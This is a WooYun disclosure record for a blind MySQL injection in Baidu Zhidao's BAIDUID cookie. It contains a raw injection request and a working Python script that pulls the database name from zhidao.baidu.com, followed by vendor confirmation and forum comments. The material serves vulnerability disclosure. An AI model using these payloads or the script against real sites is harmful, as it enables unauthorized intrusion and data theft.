{"id": 47116, "wybug_id": "wooyun-2014-088037", "wybug_title": "百度知道一处MySQL注射(附验证脚本)", "wybug_corp": "百度", "wybug_author": "lijiejie", "wybug_date": "2014-12-21 16:23", "wybug_open_date": "2015-02-04 16:24", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-04：\t细节向公众公开  简要描述： 百度知道一处MySQL注射(附验证脚本) 详细说明：  注入点：\nGET /liuyan/detail HTTP/1.1Cookie: BAIDUID=-1'%20OR%20ascii(mid(database(),1,1))!=1%20AND%201=1%20--%20X-Requested-With: XMLHttpRequestReferer: http://zhidao.baidu.comHost: zhidao.baidu.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*\nCookie中BAIDUID可注入。   漏洞证明：  表达式为True时，页面返回302；为false，返回200.示例猜解database()，得到：\niknow_liuyan\n\n\n验证脚本：\nimport httplibimport timeimport stringimport sysimport randomimport urllibheaders = {    'Cookie': '',    'User-Agent': 'Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',}payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')print 'Try to retrive database():'user = ''for i in range(1, 13):    for payload in payloads:        conn = httplib.HTTPConnection('zhidao.baidu.com', timeout=60)        random.seed()        s = str(random.random()) + \"' OR ascii(mid(database(),%s,1))=%s AND 1=1 -- \"  % (i, ord(payload))        headers['Cookie'] = 'BAIDUID=' + urllib.quote(s)        conn.request(method='GET', url= '/liuyan/detail', headers = headers)        resp = conn.getresponse()        html_doc = resp.read()        if resp.status == 302:            user += payload            print '\\n[In Progress]', user             break        else:            print '.',                    conn.close()print '\\n[Done], current db is', user\n   修复方案：  过滤，转义   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-12-22 14:29 厂商回复： 感谢提交，已通知业务部门处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-21 16:35 |    \t\t安然意境 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:79        | 无论是你的事业还是你的个人，可能走的过程...)\t\t \n  专注注射。    \n     2014-12-21 18:01 |    \t\t子墨 \t\t\t( 普通白帽子  |\t\t\t        Rank:194 漏洞数:22        | 天地不仁,以万物为刍狗;圣人不仁,以百姓为...)\t\t \n  膜拜    \n     2014-12-21 19:59 |    \t\tki11y0u \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:23        | 好好学习，求带飞~~~~~~~~~~~~~~~~~~~~~~...)\t\t \n  膜拜     \n     2014-12-21 21:52 |    \t\tCroxy \t\t\t( 普通白帽子  |\t\t\t        Rank:513 漏洞数:54        | 只会送人头)\t\t \n  吊吊吊    \n     2014-12-21 22:37 |    \t\tlaoyao \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:5        | ด้้้้้็็็็็้้้้้็็็็...)\t\t \n  膜拜    \n     2014-12-22 14:44 |    \t\tchar \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:3        | 中国平安，不只保险这么简单。)\t\t \n  @安然意境 +三十年    \n     2015-01-04 15:29 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  居然是百度知道啊！那么给力，而且这个liuyan谁啊，那么给力还做数据库名    \n     2015-01-14 12:38 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  iknow_柳岩    \n     2015-02-04 16:32 |    \t\t苦咖啡 \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:10        | 我就一菜逼，来看大牛装逼的)\t\t \n  柳岩  我女神啊 不会吧 百度的工程屌丝也喜欢 ？    \n     2015-02-04 17:40 |    \t\tF4K3R \t\t\t( 普通白帽子  |\t\t\t        Rank:297 漏洞数:31        | 学习)\t\t \n  @′雨。 @wefgod 我猜是留言。。    \n     2015-02-04 17:56 |    \t\tdir \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | http://www.wooyun.org/)\t\t \n  注射帝    \n     2015-02-04 19:57 |    \t\tpw0 \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:2        | 爱推理，爱计算机，爱社工，爱挖有（wei）...)\t\t \n  厉害，瀏甗都不知道是我男神啊    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}